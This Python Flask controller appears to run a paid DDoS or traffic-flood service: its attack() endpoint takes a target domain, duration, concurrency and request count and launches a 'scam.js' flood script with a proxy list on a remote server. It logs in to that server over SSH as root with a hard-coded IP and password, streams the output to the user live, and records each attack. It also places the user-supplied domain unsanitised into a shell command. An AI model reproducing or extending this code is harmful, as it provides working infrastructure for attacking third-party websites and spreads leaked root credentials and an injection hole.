from flask import jsonify, request, current_app
from app.extensions import socketio
from app.models.attack_log import AttackLog
from app.db import db
import paramiko
import threading
import json

class AttackController:
    def _streamOutput(self, channel, socketId, attackLogId, app):
        with app.app_context():
            fullOutput = ""
            while True:
                if channel.recv_ready():
                    output = channel.recv(4096).decode()
                    fullOutput += output
                    socketio.emit('log_message', {'data': output}, room=socketId)
                if channel.recv_stderr_ready():
                    errorOutput = channel.recv_stderr(4096).decode()
                    fullOutput += f"ERROR: {errorOutput}"
                    socketio.emit('log_message', {'data': f"ERROR: {errorOutput}"}, room=socketId)
                if channel.exit_status_ready():
                    # Update attack log with final output
                    attackLog = db.session.query(AttackLog).filter_by(id=attackLogId).first()

                    print("Attack completed")
                    if attackLog:
                        attackLog.output = fullOutput
                        attackLog.status = 'completed'
                        db.session.commit()
                    break

    def _executeRemoteCommand(self, hostName, userName, passWord, command, socketId, attackLogId):
        try:
            sshClient = paramiko.SSHClient()
            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshClient.connect(hostName, username=userName, password=passWord)
            
            transport = sshClient.get_transport()
            channel = transport.open_session()
            channel.get_pty()
            channel.exec_command(command)

            app = current_app._get_current_object()  # Get the actual app instance
            streamThread = threading.Thread(
                target=self._streamOutput, 
                args=(channel, socketId, attackLogId, app)
            )
            streamThread.daemon = True
            streamThread.start()
            
            return True, None
        except Exception as e:
            # Update attack log status on error
            attackLog = AttackLog.query.get(attackLogId)
            if attackLog:
                attackLog.status = 'failed'
                attackLog.output = str(e)
                db.session.commit()
            return False, str(e)

    def attack(self):
        currentUser = request.currentUser
        data = request.get_json()

        socketId = data.get('sid', '')
        domainName = data.get('domain', '')
        timeValue = data.get('time', '60')
        concurrentValue = data.get('concurrents', '10')
        requestCount = data.get('requests', '100')
        
        # Get headers from request headers
        headers = dict(request.headers)
        # Remove default headers we don't want to store
        headers.pop('Host', None)
        headers.pop('Content-Length', None)
        headers.pop('Content-Type', None)
        headers.pop('User-Agent', None)
        headers.pop('Accept', None)
        headers.pop('Accept-Encoding', None)
        headers.pop('Connection', None)
        headers.pop('Authorization', None)

        if not domainName:
            return jsonify({
                "status": "error",
                "message": "Domain is required"
            }), 400

        command = f"xvfb-run /root/.nvm/versions/node/v20.18.1/bin/node scam.js {domainName} {timeValue} {concurrentValue} {requestCount} proxy.txt --debug true --auth true"

        # Create attack log entry
        attackLog = AttackLog(
            userId=currentUser['id'],
            domainName=domainName,
            time=int(timeValue),
            concurrent=int(concurrentValue),
            request=int(requestCount),
            command=command,
            headers=json.dumps(headers) if headers else None
        )
        db.session.add(attackLog)
        db.session.commit()

        hostName = "199.204.99.242"
        userName = "root" 
        passWord = "42f1cb88E05w"
        
        success, error = self._executeRemoteCommand(hostName, userName, passWord, command, socketId, attackLog.id)
        
        if not success:
            return jsonify({
                "status": "error",
                "message": error
            }), 500
            
        return jsonify({
            "status": "success",
            "message": "Attack started. Check websocket for live logs.",
            "attackLogId": attackLog.id
        })

    def getLogs(self):
        currentUser = request.currentUser
        limit = int(request.args.get('limit', 10))
        page = int(request.args.get('page', 1))
        skip = (page - 1) * limit

        query = AttackLog.query.filter_by(userId=currentUser['id'])
        logs = query.order_by(AttackLog.createdAt.desc()).limit(limit).offset(skip).all()
        total = query.count()

        return jsonify({
            'logs': [log.toDict() for log in logs],
            'meta': {
                'total': total,
                'totalPages': -(-total // limit),
                'currentPage': page,
                'pageSize': limit
            }
        }), 200

    def getLog(self, logId: int):
        currentUser = request.currentUser
        log = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
        
        if not log:
            return jsonify({
                "status": "error",
                "message": "Log not found"
            }), 404

        return jsonify({
            "status": "success",
            "data": log.toDict()
        }), 200